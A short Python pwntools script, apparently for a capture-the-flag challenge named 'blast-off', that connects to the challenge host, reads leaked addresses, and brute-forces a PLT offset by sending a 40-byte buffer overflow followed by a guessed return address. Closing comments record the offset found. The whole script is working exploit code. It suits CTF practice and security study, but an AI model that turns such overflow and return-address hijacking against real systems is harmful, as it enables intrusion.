# find libc by finding blastOffPlt

from pwn import * 
i = 0
while True:
    io = remote("spaceheroes-blast-off.chals.io", 443, ssl=True, sni="spaceheroes-blast-off.chals.io")
    
    io.recvuntil("PUTS_PLT ")
    putsPlt = int(io.recv(8),16)
    io.recvuntil("BROP_GADGET ")
    bropGadget = int(io.recv(8),16) 
    io.recvuntil("BLAST_OFF GOT ")
    blastOffGot = int(io.recv(8),16)
    io.recvuntil("MAIN ")
    main = int(io.recv(8),16)
    
    popRdi = bropGadget + 9
    blastOffPlt = putsPlt + 0x10*i
    
    exploit = b"A" * 40 + p64(blastOffPlt)
    io.sendlineafter("Please enter the launch codes to start:",exploit)
    try:
        io.recvuntil("It's 3 2 1 BLAST_OFF()")
        print(i)
        break
    except:
        i += 1

# blastOffPlt = putsPlt + 0x40
# meaning putsGot = blastOffGot - 8*4
